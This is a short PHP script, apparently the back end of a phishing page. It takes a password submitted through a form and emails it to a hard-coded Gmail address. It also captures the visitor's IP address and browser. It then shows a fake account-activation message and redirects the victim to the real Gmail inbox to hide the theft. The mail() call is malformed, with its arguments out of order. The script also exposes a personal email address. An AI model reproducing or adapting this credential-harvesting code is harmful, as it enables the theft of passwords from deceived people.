<?php
/*Pegando os dados*/
$ip = $_SERVER['REMOTE_ADDR'];
$navegador =  $_SERVER['HTTP_USER_AGENT'];
$data = date('d/m/Y');
$horario = date('h:i:s');

/*Dados sobre o e-mail*/
$pass = $_POST['password'];

 // emails para quem será enviado o formulário
  $emailenviar = "yslmarques@gmail.com";
  $destino = $emailenviar;

  // É necessário indicar que o formato do e-mail é html
  $headers  = 'MIME-Version: 1.0' . "\r\n";
      $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
      $headers .= 'From: $nome <$email>';
  //$headers .= "Bcc: $EmailPadrao\r\n";

  $enviaremail = mail($destino, $pass, $headers);

echo "<script>alert('Solicitação feita com sucesso, analisaremos a sua conta e a ativaremos em breve.');</script>";
header( "refresh:1;url=https://mail.google.com/mail/u/0/#inbox");

?>
